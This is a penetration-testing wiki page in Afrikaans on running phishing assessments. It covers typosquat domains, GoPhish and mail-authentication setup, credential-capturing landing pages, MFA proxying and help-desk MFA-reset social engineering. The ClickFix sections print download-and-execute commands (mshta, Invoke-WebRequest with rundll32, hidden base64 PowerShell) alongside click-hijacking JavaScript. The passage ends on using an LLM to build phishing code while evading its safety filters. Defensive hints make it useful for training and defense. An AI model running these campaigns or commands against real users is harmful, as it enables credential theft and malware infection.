# Phishing-metodologie

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Verken die slagoffer
1. Kies die **slagoffer se domein**.
2. Voer basiese web-enumerasie uit deur **aanmeldportale te soek** wat deur die slagoffer gebruik word, en **besluit** watter een jy gaan **naboots**.
3. Gebruik **OSINT** om **e-posadresse te vind**.
2. Berei die omgewing voor
1. **Koop die domein** wat jy vir die phishing-assessment gaan gebruik
2. **Konfigureer die e-posdiens** se verwante rekords (SPF, DMARC, DKIM, rDNS)
3. Konfigureer die VPS met **gophish**
3. Berei die veldtog voor
1. Berei die **e-possjabloon** voor
2. Berei die **webblad** voor om die geloofsbriewe te steel
4. Begin die veldtog!

## Genereer soortgelyke domeinname of koop ’n vertroude domein

### Tegnieke vir variasie van domeinname

- **Sleutelwoord**: Die domeinnaam **bevat** ’n belangrike **sleutelwoord** van die oorspronklike domein (bv. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomein met koppeltekens**: Verander die **punt na ’n koppelteken** van ’n subdomein (bv. www-zelster.com).
- **Nuwe TLD**: Dieselfde domein met ’n **nuwe TLD** (bv. zelster.org)
- **Homoglyph**: Dit **vervang** ’n letter in die domeinnaam met **letters wat soortgelyk lyk** (bv. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Dit **ruil twee letters** binne die domeinnaam om (bv. zelsetr.com).
- **Singularization/Pluralization**: Voeg “s” aan die einde van die domeinnaam by of verwyder dit (bv. zeltsers.com).
- **Weglating**: Dit **verwyder een** van die letters uit die domeinnaam (bv. zelser.com).
- **Herhaling:** Dit **herhaal een** van die letters in die domeinnaam (bv. zeltsser.com).
- **Vervanging**: Soos homoglyph, maar minder onopvallend. Dit vervang een van die letters in die domeinnaam, moontlik met ’n letter naby die oorspronklike letter op die sleutelbord (bv. zektser.com).
- **Subdomein-invoeging**: Voeg ’n **punt** binne die domeinnaam in (bv. ze.lster.com).
- **Invoeging**: Dit **voeg ’n letter** by die domeinnaam in (bv. zerltser.com).
- **Ontbrekende punt**: Voeg die TLD by die domeinnaam. (bv. zelstercom.com)

**Outomatiese Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webwerwe**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Daar is ’n **moontlikheid dat een van die bisse wat gestoor word of in kommunikasie gebruik word, outomaties kan omdraai** weens verskeie faktore soos sonvlamme, kosmiese strale of hardewarefoute.

Wanneer hierdie konsep **op DNS-versoeke toegepas word**, is dit moontlik dat die **domein wat deur die DNS-bediener ontvang word** nie dieselfde is as die domein wat aanvanklik versoek is nie.

Byvoorbeeld, ’n enkele bis-wysiging in die domein "windows.com" kan dit na "windnws.com" verander.

Aanvallers kan **hierdie moontlikheid uitbuit deur verskeie bit-flipping-domeine te registreer** wat soortgelyk aan die slagoffer se domein is. Hulle bedoeling is om wettige gebruikers na hul eie infrastruktuur te herlei.

Vir meer inligting, lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup>

### Koop ’n vertroude domein

Jy kan by [https://www.expireddomains.net/](https://www.expireddomains.net) na ’n vervalde domein soek wat jy kan gebruik.\
Om seker te maak dat die vervalde domein wat jy gaan koop **reeds ’n goeie SEO het**, kan jy soek hoe dit gekategoriseer word in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Ontdekking van e-posadresse

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratis)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratis)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om **meer** geldige e-posadresse te **ontdek** of die adresse wat jy reeds ontdek het te **verifieer**, kan jy kyk of jy dit op die slagoffer se smtp-bedieners kan brute-force. [Leer hier hoe om e-posadresse te verifieer/ontdek](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moet ook nie vergeet dat, indien die gebruikers **enige webportaal gebruik om toegang tot hul e-pos te verkry**, jy kan kyk of dit kwesbaar is vir **username brute force**, en die kwesbaarheid kan uitbuit indien moontlik nie.

## Konfigurasie van GoPhish

### Installasie

Jy kan dit aflaai by [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af en dekomprimeer dit binne `/opt/gophish`, en voer `/opt/gophish/gophish` uit\
Jy sal ’n wagwoord vir die admin-gebruiker op poort 3333 in die uitvoer kry. Gaan daarom na daardie poort en gebruik daardie geloofsbriewe om die admin-wagwoord te verander. Jy sal moontlik daardie poort na local moet tunnel:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfigurasie

**TLS-sertifikaatkonfigurasie**

Voor hierdie stap moet jy die **domein wat jy gaan gebruik reeds gekoop het**, en dit moet na die **IP van die VPS** wys waar jy **gophish** konfigureer.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Poskonfigurasie**

Begin met installering: `apt-get install postfix`

Voeg dan die domain by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes binne /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Laastens, wysig die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domainnaam en **herbegin jou VPS.**

Skep nou ’n **DNS A record** van `mail.<domain>` wat na die **IP-adres** van die VPS wys, en ’n **DNS MX** record wat na `mail.<domain>` wys.

Kom ons toets nou om ’n e-pos te stuur:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-konfigurasie**

Stop die uitvoering van gophish en kom ons konfigureer dit.\
Wysig `/opt/gophish/config.json` na die volgende (let op die gebruik van https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Stel gophish-diens op**

Om die gophish-diens te skep sodat dit outomaties begin en as ’n diens bestuur kan word, kan jy die lêer `/etc/init.d/gophish` met die volgende inhoud skep:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Voltooi die konfigurasie van die diens en kontroleer dit deur:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigureer mail server en domein

### Wag & wees legit

Hoe ouer 'n domein is, hoe minder waarskynlik is dit dat dit as spam geïdentifiseer sal word. Jy moet dus so lank as moontlik wag (ten minste 1week) voordat die phishing-assessering plaasvind. Boonop sal die reputasie wat verkry word beter wees as jy 'n bladsy oor 'n reputasiesektor plaas.

Let daarop dat jy alles nou kan klaar konfigureer, selfs al moet jy 'n week wag.

### Konfigureer Reverse DNS (rDNS)-rekord

Stel 'n rDNS (PTR)-rekord op wat die IP-adres van die VPS na die domeinnaam resolve.

### Sender Policy Framework (SPF)-rekord

Jy moet **'n SPF-rekord vir die nuwe domein konfigureer**. As jy nie weet wat 'n SPF-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Jy kan [https://www.spfwizard.net/](https://www.spfwizard.net) gebruik om jou SPF-beleid te genereer (gebruik die IP van die VPS-masjien)

![SPF Wizard-vorm vir die generering van 'n SPF-rekord vir 'n phishing-domein](<../../images/image (1037).png>)

Dit is die inhoud wat binne 'n TXT-rekord binne die domein gestel moet word:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC)-rekord

Jy moet ’n DMARC-rekord vir die nuwe domain **configure**. As jy nie weet wat ’n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet ’n nuwe DNS TXT-rekord skep wat na die hostname `_dmarc.<domain>` wys, met die volgende inhoud:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Jy moet **'n DKIM vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC record is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Hierdie tutoriaal is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> Jy moet albei B64-waardes wat die DKIM-sleutel genereer, aaneenskakel:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Toets jou e-poskonfigurasietelling

Jy kan dit doen deur [https://www.mail-tester.com/](https://www.mail-tester.com) te gebruik\
Gaan eenvoudig na die bladsy en stuur 'n e-pos na die adres wat hulle aan jou gee:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Jy kan ook jou **e-poskonfigurasie nagaan** deur ’n e-pos aan `check-auth@verifier.port25.com` te stuur en **die antwoord te lees** (hiervoor sal jy poort **25** moet **oopmaak** en die antwoord in die lêer _/var/mail/root_ sien as jy die e-pos as root stuur).\
Maak seker dat jy al die toetse slaag:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Jy kan ook 'n **boodskap na 'n Gmail-rekening onder jou beheer stuur**, en die **e-pos se kopte** in jou Gmail-inboks nagaan; `dkim=pass` behoort in die `Authentication-Results`-kopveld teenwoordig te wees.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Verwydering van Spamhaus-swartlys

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domein deur Spamhaus geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Verwydering van Microsoft-swartlys

​​Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Skep & Begin GoPhish Campaign

### Sending Profile

- Stel ’n **naam om** die senderprofiel te identifiseer
- Besluit vanaf watter rekening jy die phishing-e-posse gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk

![Skep & Begin GoPhish Campaign - Sending Profile: Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die funksionaliteit "**Send Test Email**" te gebruik om te toets dat alles werk.\
> Ek sal aanbeveel om die toets-e-posse na 10min-posadresse te stuur om te voorkom dat jy tydens die toetse op ’n swartlys geplaas word.

### E-pos Template

- Stel ’n **naam om** die sjabloon te identifiseer
- Skryf dan ’n **onderwerp** (niks vreemds nie, net iets wat jy sou verwag om in ’n gewone e-pos te lees)
- Maak seker dat jy "**Add Tracking Image**" gemerk het
- Skryf die **e-possjabloon** (jy kan veranderlikes soos in die volgende voorbeeld gebruik):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Let daarop dat **om die geloofwaardigheid van die e-pos te verhoog**, dit aanbeveel word om ’n handtekening uit ’n e-pos van die kliënt te gebruik. Voorstelle:

- Stuur ’n e-pos na ’n **nie-bestaande adres** en kyk of die antwoord enige handtekening bevat.
- Soek vir **openbare e-posadresse** soos info@ex.com of press@ex.com of public@ex.com, stuur vir hulle ’n e-pos en wag vir die antwoord.
- Probeer om ’n **geldige ontdekte** e-posadres te kontak en wag vir die antwoord.

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM-challenges met spesiaal vervaardigde lêers/dokumente wil steel, [lees hierdie bladsy](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Stel ’n **naam** in.
- **Skryf die HTML-kode** van die webblad. Let daarop dat jy webblaaie kan **invoer**.
- Merk **Capture Submitted Data** en **Capture Passwords**.
- Stel ’n **herleiding** in.

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML-kode van die bladsy moet wysig en plaaslik ’n paar toetse moet uitvoer (moontlik met behulp van ’n Apache-bediener) **totdat jy tevrede is met die resultate.** Skryf dan daardie HTML-kode in die blokkie.\
> Let daarop dat, indien jy **statiese hulpbronne** vir die HTML moet **gebruik** (moontlik sommige CSS- en JS-bladsye), jy dit in _**/opt/gophish/static/endpoint**_ kan stoor en dit dan vanaf _**/static/\<filename>**_ kan gebruik.

> [!TIP]
> Vir die herleiding kan jy die **gebruikers na die slagoffer se wettige hoofwebblad herlei**, of hulle byvoorbeeld na _/static/migration.html_ herlei, ’n **draaiende wiel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes vertoon en dan aandui dat die proses suksesvol was**.

### Users & Groups

- Stel ’n naam in.
- **Voer die data in** (let daarop dat jy, om die template vir die voorbeeld te gebruik, die voornaam, van en e-posadres van elke gebruiker benodig).

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Skep laastens ’n campaign deur ’n naam, die Email Template, die Landing Page, die URL, die Sending Profile en die groep te kies. Let daarop dat die URL die skakel sal wees wat aan die slagoffers gestuur word.

Let daarop dat die **Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos lyk**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ek sal aanbeveel om die **toets-e-posse na 10min-posadresse te stuur** om te voorkom dat jy tydens die toetse op ’n blacklist geplaas word.

Sodra alles gereed is, begin bloot die campaign!

## Website Cloning

As jy om enige rede die webwerf wil kloon, kyk na die volgende bladsy:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In sommige phishing-assesseringe (hoofsaaklik vir Red Teams) sal jy ook **lêers wil stuur wat een of ander soort backdoor bevat** (moontlik ’n C2 of bloot iets wat ’n authentication sal aktiveer).\
Kyk na die volgende bladsy vir ’n paar voorbeelde:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige aanval is redelik slim, aangesien jy ’n werklike webwerf namaak en die inligting wat deur die gebruiker ingevoer word, versamel. Ongelukkig, as die gebruiker nie die korrekte password ingevoer het nie, of as die toepassing wat jy nageboots het met 2FA gekonfigureer is, **sal hierdie inligting jou nie toelaat om die misleide gebruiker na te boots nie**.

Dit is waar tools soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie tool laat jou toe om ’n MitM-agtige aanval te genereer. Basies werk die aanval soos volg:

1. Jy **boots die login**-vorm van die werklike webblad na.
2. Die gebruiker **stuur** sy **credentials** na jou fake bladsy en die tool stuur dit na die werklike webblad, **en kontroleer of die credentials werk**.
3. As die account met **2FA** gekonfigureer is, sal die MitM-bladsy daarvoor vra en, sodra die **gebruiker dit invoer**, sal die tool dit na die werklike webblad stuur.
4. Sodra die gebruiker ge-authenticate is, sal jy (as aanvaller) die **credentials, die 2FA, die cookie en enige inligting** van elke interaksie hê wat plaasvind terwyl die tool ’n MitM uitvoer.

### Via VNC

Wat as jy, in plaas daarvan om **die slagoffer na ’n kwaadwillige bladsy** met dieselfde voorkoms as die oorspronklike een te stuur, hom na ’n **VNC-sessie met ’n browser wat aan die werklike webblad gekoppel is** stuur? Jy sal kan sien wat hy doen, die password steel, die gebruikte MFA, die cookies...\
Jy kan dit met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup> doen.

## Detecting the detection

Een van die beste maniere om te weet of jy uitgevang is, is natuurlik om **jou domein binne blacklists te soek**. As dit gelys word, is jou domein op een of ander manier as verdag opgespoor.\
Een maklike manier om te kyk of jou domein in enige blacklist verskyn, is om [https://malwareworld.com/](https://malwareworld.com) te gebruik.

Daar is egter ander maniere om te weet of die slagoffer **aktief na verdagte phishing-aktiwiteit in die natuur soek**, soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan **’n domein met ’n baie soortgelyke naam as die slagoffer se domein koop** en/of ’n certificate vir ’n **subdomein** van ’n domein onder jou beheer **genereer wat** die **keyword** van die slagoffer se domein bevat. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** daarmee uitvoer, sal jy weet dat **hy aktief** na verdagte domeine soek en dat jy baie stealthy sal moet wees.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious)om te evalueer of jou e-pos in die spam-lêergids gaan beland, of geblokkeer of suksesvol gaan wees.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne intrusion sets slaan toenemend e-pos-lokmiddels heeltemal oor en **teiken die service-desk / identity-recovery-werkvloei direk** om MFA te omseil. Die aanval is volledig "living-off-the-land": sodra die operator geldige credentials besit, beweeg hy lateraal met ingeboude admin-tools – geen malware word benodig nie.<sup>[[5]](#references)</sup>

### Attack flow
1. Verken die slagoffer.
* Versamel persoonlike en korporatiewe besonderhede van LinkedIn, data breaches, openbare GitHub, ens.
* Identifiseer identiteite met hoë waarde (bestuurders, IT, finansies) en bepaal die **presiese help-desk-proses** vir password / MFA-reset.
2. Intydse social engineering.
* Bel, gebruik Teams of chat met die help-desk terwyl jy jou as die teiken voordoen (dikwels met ’n **vervalste caller-ID** of **geklone stem**).
* Verskaf die vooraf versamelde PII om kennisgebaseerde verifikasie te slaag.
* Oortuig die agent om die **MFA-secret te reset** of ’n **SIM-swap** op ’n geregistreerde selfoonnommer uit te voer.
3. Onmiddellike aksies ná toegang (≤60 min in werklike gevalle).
* Vestig ’n foothold deur enige web SSO-portal.
* Enumereer AD / AzureAD met ingeboude tools (geen binaries word afgelaai nie):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Laterale beweging met **WMI**, **PsExec** of wettige **RMM**-agents wat reeds in die omgewing gewitelys is.

### Detection & Mitigation
* Behandel help-desk identity recovery as ’n **bevoorregte operasie** – vereis step-up authentication en bestuurdergoedkeuring.
* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA**-reëls wat die volgende waarsku:
* MFA-metode verander + authentication vanaf ’n nuwe toestel / geo.
* Onmiddellike elevasie van dieselfde principal (user-→-admin).
* Neem help-desk-oproepe op en dwing ’n **terugbellig na ’n reeds geregistreerde nommer** af voordat enige reset uitgevoer word.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut-geresette accounts nie outomaties hoëprivilegie-tokens erf nie.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity-groepe verreken die koste van high-touch-ops met massa-aanvalle wat **search engines en ad networks in die delivery channel omskep**.<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising** bevorder ’n vals resultaat soos `chromium-update[.]site` tot bo-aan die search ads.
2. Die slagoffer laai ’n klein **first-stage loader** af (dikwels JS/HTA/ISO). Voorbeelde wat deur Unit 42 gesien is:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Die loader eksfiltreer browser-cookies + credential DBs, en trek dan ’n **silent loader** af wat – *in realtime* – besluit of die volgende ontplooi moet word:
* RAT (bv. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence-komponent (registry Run key + scheduled task)

### Hardening tips
* Blokkeer nuut-geregistreerde domeine en dwing **Advanced DNS / URL Filtering** op *search ads* sowel as e-pos af.
* Beperk software-installation tot ondertekende MSI / Store-pakkette; weier `HTA`-, `ISO`- en `VBS`-uitvoering volgens beleid.
* Monitor vir child processes van browsers wat installers oopmaak:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Soek na LOLBins wat dikwels deur first-stage loaders misbruik word (bv. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Sommige vals software-portale hou die sigbare download-`href` na die **werklike GitHub/release-URL** gerig, maar kaap die **eerste** gebruikerinteraksie in JavaScript en stuur die slagoffer eerder na ’n **Traffic Distribution System (TDS)**-ketting.<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Sleutelkenmerke:
- Die hook loop gewoonlik in die **capture phase** (`true`) op `document`, sodat dit voor site handlers geaktiveer word.
- Chrome gebruik dikwels `mousedown` in plaas van `click` om die redirect aan ’n geldige **user gesture** gekoppel te hou en die omseiling van popup-blockers te verbeter.
- Sommige variante maak vooraf `about:blank` oop of simuleer klikke op `<a target="_blank">`, en ken eers later die TDS-URL toe.
- Browser-side caps word dikwels in `localStorage` gestoor, sodat die **eerste klik** malware kan bereik, terwyl refreshes/retries na die skadeloos-lykende sigbare skakel terugval.
- Die TDS kan volgens referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context en per-session counters filter, wat analyst replays nie-deterministies maak.

Idees vir defenders:
- Vergelyk die **displayed** `href` met die **actual** navigation target wat tydens die klik gegenereer word.
- Soek na `document.addEventListener(..., true)` handlers wat beide `preventDefault()` en `stopImmediatePropagation()` rondom `window.open`, `about:blank` of synthetic anchor clicks aanroep.
- Behandel groepe van nuut-geregistreerde software-download-domains wat almal dieselfde CloudFront/JS stage laai as ’n hoë-sein SEO-poisoning/TDS-patroon.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Sommige TDS-vertakkings eindig op ’n fake verification page (Cloudflare/IUAM-styl) wat die slagoffer sê om ’n trusted Windows binary uit te voer, soos:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Aantekeninge:
- `mshta.exe` voer die **HTA/VBScript aan die begin van die response** uit, selfs al gee die URL voor dat dit ’n `.7z`-argief is; aangehegte argiefdata kan suiwer misleiding wees.
- Opvolgstadiums hou dikwels aan om oor die lêertipe te lieg (`.rtf` vir PowerShell, `.asar` vir Python, ZIP-lêers met opgestopte binaries) en skakel dan oor na **manual PE mapping / in-memory execution**.
- As jy op een van hierdie kettings reageer, bewaar **network + memory vanaf die eerste suksesvolle run**: latere herhalings kan slegs ’n onskadelike installer/SFX-pad wys of misluk omdat die payload/key release aan die oorspronklike TDS-sessie gekoppel was.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lokmiddel: ’n gekloonde nasionale CERT-advies met ’n **Update**-knoppie wat stap-vir-stap-“fix”-instruksies vertoon. Slagoffers word aangesê om ’n batch-lêer uit te voer wat ’n DLL aflaai en dit via `rundll32` uitvoer.<sup>[[8]](#references)</sup>
* Tipiese batch-ketting wat waargeneem is:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` skryf die payload na `%TEMP%`, ’n kort wagperiode verberg network-jitter, waarna `rundll32` die uitgevoerde entrypoint (`notepad`) aanroep.
* Die DLL stuur die host identity en poll C2 elke paar minute. Remote tasking arriveer as **base64-encoded PowerShell** wat hidden uitgevoer word, met policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Dit behou C2-flexibility (die server kan tasks omruil sonder om die DLL op te dateer) en verberg console windows. Soek vir PowerShell children van `rundll32.exe` wat `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik.
* Defenders kan HTTP(S)-callbacks van die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minute polling-intervalle ná DLL-load dophou.

---

## AI-Enhanced Phishing Operations
Aanvallers ketting nou **LLM & voice-clone APIs** vir volledig gepersonaliseerde lokmiddels en intydse interaksie.

| Layer | Voorbeeldgebruik deur threat actor |
|-------|------------------------------------|
|Automation|Genereer & stuur >100 k e-posse / SMS’e met ewekansige bewoording & tracking links.|
|Generative AI|Produseer *one-off* e-posse wat na openbare M&A verwys, asook private grappies van social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Registreer domeine outonoom, scrape open-source intel, en stel next-stage e-posse saam wanneer ’n slagoffer klik maar nie credentials indien nie.|

**Defence:**
• Voeg **dynamic banners** by wat messages uit onbetroubare automation beklemtoon (via ARC/DKIM-anomalieë).
• Implementeer **voice-biometric challenge phrases** vir hoërisiko-telefoonversoeke.
• Simuleer voortdurend AI-generated lokmiddels in awareness-programme – statiese templates is verouderd.

Sien ook – agentic browsing abuse vir credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Sien ook – AI agent abuse van plaaslike CLI-tools en MCP (vir secrets inventory en detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Aanvallers kan skynbaar onskadelike HTML stuur en die stealer **at runtime genereer** deur ’n **trusted LLM API** vir JavaScript te vra en dit dan in die browser uit te voer (bv. `eval` of dynamic `<script>`).<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** enkodeer exfil-URLs/Base64-strings in die prompt; herhaal die bewoording om safety filters te omseil en hallusinasies te verminder.
